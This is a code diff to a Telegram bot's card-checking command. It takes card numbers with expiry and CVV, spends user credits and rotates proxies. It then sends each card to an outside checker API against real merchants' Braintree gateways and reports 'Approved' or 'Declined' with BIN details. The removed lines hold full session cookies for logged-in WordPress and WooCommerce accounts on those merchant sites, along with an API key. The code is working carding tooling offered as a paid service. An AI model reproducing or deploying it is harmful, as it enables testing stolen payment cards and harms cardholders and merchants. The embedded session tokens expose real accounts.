@@ -5583,8 +5583,9 @@ from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 from db import get_user, update_user  # credit system
 import urllib.parse
-import aiohttp
-import asyncio
+import re
+
+logger = logging.getLogger(__name__)
 
 # --- Load proxies ---
 PROXIES_FILE = "proxies.txt"
@@ -5615,119 +5616,12 @@ async def get_next_proxy():
         else:
             raise ValueError(f"Invalid proxy format: {proxy_str}")
 
-
-
-logger = logging.getLogger(__name__)
+# --- Cooldown and API config ---
 BASE_COOLDOWN = 13  # Base cooldown in seconds
-API_URL = "https://autob3cook.onrender.com/check?"
-API_KEY = "Xcracker911"
-SITE = "https://iditarod.com"
-
-# --- Cookie rotation pool ---
-COOKIES_LIST = [
-    # --- Cookie 1 ---
-    '''PHPSESSID=qftvknrnpks4u241irano91gbs;
-sbjs_migrations=1418474375998%3D1;
-sbjs_current_add=fd%3D2025-09-13%2007%3A03%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Flost-password%2F%3Fshow-reset-form%3Dtrue%26action%7C%7C%7Crf%3D%28none%29;
-sbjs_first_add=fd%3D2025-09-13%2007%3A03%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Flost-password%2F%3Fshow-reset-form%3Dtrue%26action%7C%7C%7Crf%3D%28none%29;
-sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F140.0.0.0%20Safari%2F537.36;
-_ga=GA1.1.41997297.1757748816;
-_fbp=fb.1.1757748816501.35526249204946697;
-wordpress_logged_in_8fb226385f454fe1b19f20c68cef99ad=_aaditya07r_%7C1758958437%7CK9XOlTGiEQwl320Zgp80vLD4hRLpOerfqzAGx7vRa8C%7C381a72fabd1295bca6efa996f821bd98672178761c725691cce3fa1b1505083b;
-sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2F%3Fpassword-reset%3Dtrue;
-cookieconsent_status=dismiss;
-mailpoet_page_view=%7B%22timestamp%22%3A1757749022%7D;
-_ga_GEWJ0CGSS2=GS2.1.s1757748816$o1$g1$t1757749035$j52$l0$h316575648;'''
-
-    
-    # --- Cookie 2 ---
-    '''PHPSESSID=6id9435okaa4ro85vp8s72vng3;
-_ga=GA1.1.1348851683.1757748688;
-sbjs_migrations=1418474375998%3D1;
-sbjs_current_add=fd%3D2025-09-13%2007%3A01%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29;
-sbjs_first_add=fd%3D2025-09-13%2007%3A01%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29;
-sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-_fbp=fb.1.1757748688643.911751162166436883;
-wordpress_logged_in_8fb226385f454fe1b19f20c68cef99ad=_aaditya07r%7C1758962016%7CAnncsejn12RZ4ZJHqyUG0bPOACfZ2gBxlM6Ldb9QNTM%7Cd0e0bebae43eba02ce3d36961c65d45a5d8a7135200736b023d3f5c19b4e866f;
-mailpoet_page_view=%7B%22timestamp%22%3A1757752417%7D;
-sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F140.0.0.0%20Mobile%20Safari%2F537.36;
-sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fiditarod.com%2Fmy-account%2Fpayment-methods%2F;
-_ga_GEWJ0CGSS2=GS2.1.s1757752336$o2$g1$t1757752459$j14$l0$h2070871103;'''
-
-    # --- Cookie 3 ---
-    '''_ga=GA1.1.1954829047.1757872504;
-__ctmid=68c701780004f57a1565004b;
-__ctmid=68c701780004f57a1565004b;
-_gauges_unique_day=1;
-_gauges_unique_month=1;
-_gauges_unique_year=1;
-_gauges_unique=1;
-wordpress_logged_in_6d4646f23f06e9c175acd3e232a878ce=zerotracehacked%7C1759082178%7CbOGyC6zN1RVsGIGUKWCMxF0ivKCm7a7pUQOx2XiINJE%7C9b5b27d7db10fe448cfdf098bc268c252c21b3183c12c16d80b73282ca4dcef6;
-wp_woocommerce_session_6d4646f23f06e9c175acd3e232a878ce=77493%7C1758477380%7C1757958980%7C%24generic%24nDyrQ4HbV3Sz6hurjGxSFjmkQi6wdDpXcjmvsucS;
-__kla_id=eyJjaWQiOiJZbUZtTWprMU5XVXROV05tWlMwMFlURm1MVGhrWVRJdFlURm1ZVFV4TVRReE4yUTAiLCIkZXhjaGFuZ2VfaWQiOiJsU3NDWk12Y045OFpkaW5BcG5LYzBlTzJBMkhXbDBGbndMMWMxTFBYZ0NYUUZtMTFNQWlhWk9ZekE3U1FwOEpOLlNOZkJnNyJ9;
-_gcl_au=1.1.69780881.1757872504.1613401467.1757872566.1757874396;
-cf_clearance=mpnUzZstWvQXl5aVLlGpM6TFAFYu6.gVIU6ypIhyYbg-1757874573-1.2.1.1-.2LV_MhT42wZh2z0nnuMqcBuEQvEh1I8KmsEafG7U0uFfASa1w2Ye0IVxbbu1P6bDn9vpvzv_gRn_1qV7gqizsPbLEgLJ3DKW.2f58m0tW9jTWMqF5oqWkbAabVO48XdykjfqLCx0ZaWDE79IOCchQ1fw0Ls8EUtjlBXr59bvxXzxD3m7kf.wksLMKqQ6HoI1BqonOTNS_desaRnKR5mFDhQqmvqMPsPbLdHuQSwtTk;
-_clck=179hrve%5E2%5Efzc%5E0%5E2083;
-woocommerce_items_in_cart=1;
-woocommerce_cart_hash=0e98bc571f1efb4e6a2e9cc833e31db3;
-_ga_T35FBK70QE=GS2.1.s1757953228$o3$g0$t1757953228$j60$l0$h973532531;
-_uetsid=f13df0c0919311f0bd5ee75384cdcb1b;
-_uetvid=f13e1350919311f0b6a1f779aa3bffa2;
-_clsk=17rmqk8%5E1757953229662%5E1%5E1%5Ea.clarity.ms%2Fcollect;'''
-
-    # --- Cookie 4 ---
-    '''__ctmid=68c7b2210004f57a348a3d16;
-__ctmid=68c7b2210004f57a348a3d16;
-_gcl_au=1.1.880721484.1757917733.1998417398.1757921382.1757923396;
-_ga_T35FBK70QE=GS2.1.s1757920642$o2$g1$t1757923451$j60$l0$h2038405997;
-_ga=GA1.1.324457782.1757917735;
-_clck=1mbv5h6%5E2%5Efzc%5E0%5E2084;
-_clsk=1uklurw%5E1757923394841%5E18%5E1%5Eq.clarity.ms%2Fcollect;
-sbjs_migrations=1418474375998%3D1;
-sbjs_current_add=fd%3D2025-09-15%2006%3A00%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fhighwayandheavyparts.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhighwayandheavyparts.com%2F;
-sbjs_first_add=fd%3D2025-09-15%2006%3A00%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fhighwayandheavyparts.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhighwayandheavyparts.com%2F;
-sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
-sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A142.0%29%20Gecko%2F20100101%20Firefox%2F142.0;
-_gauges_unique_day=1;
-_gauges_unique_month=1;
-_gauges_unique_year=1;
-_gauges_unique=1;
-cf_clearance=SexZEmhpS3KEOqkuSoRjrzC0b3QNhc4vEZA8BPux49U-1757923420-1.2.1.1-vHaIN5SHq2LSRsWcqlbnyLqJv2VI8F.mp7UrcFXdegpOActyvtkNoUabPaK4.lRJXRvzIMgYDhP8vukHUO.CgxaQJXUP.yeDB_qPwkutoTRGPyzSWSVPXqVbgu0gquaneRNYp2KF30mJQUsQ7a2sA07pNMaj4oe2jQIJ1YHPu5S4GbgfS6qRmQ33K_3fro3HaNRihIRgNi.H5oBzAh_RJO4BLgD0fV_AdDkWzZOp4ec;
-PHPSESSID=b4461cff9e4cff4be4dc06fbcf7e23a8;
-sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhighwayandheavyparts.com%2Fcheckout%2F;
-_gauges_unique_hour=1;
-wordpress_logged_in_6d4646f23f06e9c175acd3e232a878ce=rockyyog%7C1759132159%7Ci67tiMb1JDkUDrzaGum3BabiK2GKTLndFgMwFwOklsm%7C25ba775fbe7960f739c4d0c29c054a8688bdc3d54faefe97ddd4b05b6318034a;
-__kla_id=eyJjaWQiOiJOVEUyTm1GbE1qY3ROMlV3TkMwMFptTXhMV0ZoWVdRdE9UUXhaREEwT1dNM09HSXgiLCIkZXhjaGFuZ2VfaWQiOiJxdHE5X1dVek03TVlpZExaRUNzYTY1WlhlWEhHVG1nUTVyZlZfTlBDSDVZLlNOZkJnNyJ9;
-woocommerce_items_in_cart=1;
-woocommerce_cart_hash=33fce3a9c86df6e9b29111c8428d006f;
-wp_woocommerce_session_6d4646f23f06e9c175acd3e232a878ce=77524%7C1758527715%7C1758009315%7C%24generic%24f-G_m_2Kzv6sgI-ukGY57OQRdsBjvOtli1GLyvTe;
-_uetsid=422cb0f091fd11f09d95478daf460df3;
-_uetvid=422d20b091fd11f0a830eb4c11814c3c;'''
-
-    
-]
-
-# --- Helper: Convert dict → raw cookie string (NO extra encoding) ---
-def cookies_dict_to_string(cookies: dict) -> str:
-    return ";".join([f"{k}={v}" for k, v in cookies.items()])
-
-# --- Cookie rotation index ---
-cookie_index = 0
-
-# --- Cooldown tracker (per-user) ---
-user_last_command_time = {}
-COOLDOWN_SECONDS = BASE_COOLDOWN // len(COOKIES_LIST)  # e.g., 2 cookies → cooldown halved
-
-# --- Rotate cookies ---
-def get_next_cookie():
-    global cookie_index
-    cookie = COOKIES_LIST[cookie_index]
-    cookie_index = (cookie_index + 1) % len(COOKIES_LIST)  # rotate cookies
-    return cookie
+COOLDOWN_SECONDS = BASE_COOLDOWN
+API_URL = "https://xautob3.onrender.com/check"
+API_KEY = "XCRacker"
+SITE = "https://highwayandheavyparts.com"
 
 # --- Credit System ---
 async def consume_credit(user_id: int) -> bool:
@@ -5741,10 +5635,10 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 # --- /b3 Command ---
-import re
-
-# Card regex
 CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
+
+# cooldown tracker (per-user)
+user_last_command_time = {}
 
 async def b3(update: Update, context):
     user = update.effective_user
@@ -5794,7 +5688,7 @@ async def b3(update: Update, context):
     processing_text = (
         f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
         f"<pre><code>{full_card}</code></pre>\n\n"
-        f"{bullet_link} <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑨𝒖𝒕𝒉</b>\n"
+        f"{bullet_link} <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝗲𝗲 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑨𝒖𝒕𝗵</b>\n"
         f"{bullet_link} <b>𝗦𝘁𝗮𝘁𝘂𝘀 ➵ Checking 🔎...</b>"
     )
 
@@ -5802,7 +5696,7 @@ async def b3(update: Update, context):
         processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
     )
 
-    # Launch checker
+    # Launch checker (fire-and-forget like before)
     asyncio.create_task(run_braintree_check(user, cc_input, full_card, processing_msg))
 
 
@@ -5813,44 +5707,43 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     try:
         timeout = aiohttp.ClientTimeout(total=50)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            
-            # ✅ First rotate cookie + proxy
-            cookie_str = get_next_cookie()       # one cookie per req
-            proxy_url = await get_next_proxy()   # one proxy per req
+            # Rotate proxy
+            proxy_url = await get_next_proxy()   # may be None
 
-            # ✅ Now build params with those
+            # Build params for new API (no cookies)
             params = {
                 "key": API_KEY,
                 "site": SITE,
-                "cookies": cookie_str,
                 "cc": cc_input,
-                "proxy": proxy_url
+                # API expects proxy param even if empty
+                "proxy": proxy_url or ""
             }
 
-            # ✅ Debug log full API call
+            # Debug log full API call
             query = "&".join([f"{k}={v}" for k, v in params.items()])
             logger.info(f"[DEBUG] Full API URL: {API_URL}?{query}")
 
             try:
-                async with session.get(API_URL, params=params) as resp:  # 🚫 no proxy= here, only in API
+                async with session.get(API_URL, params=params) as resp:
                     if resp.status != 200:
                         await processing_msg.edit_text(
-                            f"❌ API returned HTTP {resp.status} | Proxy: {proxy_url} | Cookie: {cookie_str}",
+                            f"❌ API returned HTTP {resp.status} | Proxy: {proxy_url or 'Not provided'}",
                             parse_mode=ParseMode.HTML
                         )
                         return
+
                     try:
                         data = await resp.json(content_type=None)
                     except Exception:
                         text = await resp.text()
                         await processing_msg.edit_text(
-                            f"❌ Failed parsing API response:\n<code>{escape(text)}</code>\nProxy: {proxy_url}\nCookie: {cookie_str}",
+                            f"❌ Failed parsing API response:\n<code>{escape(text)}</code>\nProxy: {proxy_url or 'Not provided'}",
                             parse_mode=ParseMode.HTML
                         )
                         return
             except Exception as e:
                 await processing_msg.edit_text(
-                    f"❌ Request error:\n<code>{escape(str(e))}</code>\nProxy: {proxy_url}\nCookie: {cookie_str}",
+                    f"❌ Request error:\n<code>{escape(str(e))}</code>\nProxy: {proxy_url or 'Not provided'}",
                     parse_mode=ParseMode.HTML
                 )
                 return
@@ -5867,17 +5760,21 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         )
         return
 
-
-
-    # --- API response ---
+    # --- API response expected structure ---
+    # {
+    #   "cc":"544...|10|27|4046",
+    #   "proxy":"Not provided",
+    #   "response":"...message...",
+    #   "status":"DECLINED"
+    # }
     cc = data.get("cc", cc_input)
     response = data.get("response", "No response")
     status = data.get("status", "UNKNOWN").upper()
-    stylish_status = "✅ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b>" if status == "APPROVED" else "❌ <b>𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱</b>"
+    stylish_status = "✅ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b>" if status == "APPROVED" or status == "APPROVE" else "❌ <b>𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱</b>"
 
-    # --- BIN lookup ---
+    # --- BIN lookup (if you have get_bin_info implemented; otherwise defaults) ---
     try:
-        bin_number = cc[:6]
+        bin_number = cc.split("|")[0][:6]
         bin_details = await get_bin_info(bin_number)
         brand = (bin_details.get("scheme") or "N/A").title()
         issuer = bin_details.get("bank") or "N/A"
@@ -5906,7 +5803,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     final_msg = (
         f"◇━━〔 {stylish_status} 〕━━◇\n"
         f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑨𝒖𝒕𝒉\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝗿𝗲𝗲 𝑷𝒓𝒆𝗺𝗶𝒖𝗺 𝑨𝒖𝒕𝗵\n"
         f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{escape(response)}</i>\n"
         "――――――――――――――――\n"
         f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -5921,6 +5818,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         await processing_msg.edit_text(final_msg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     except Exception as e:
         logger.exception("Error editing final message")
+
 
 
 
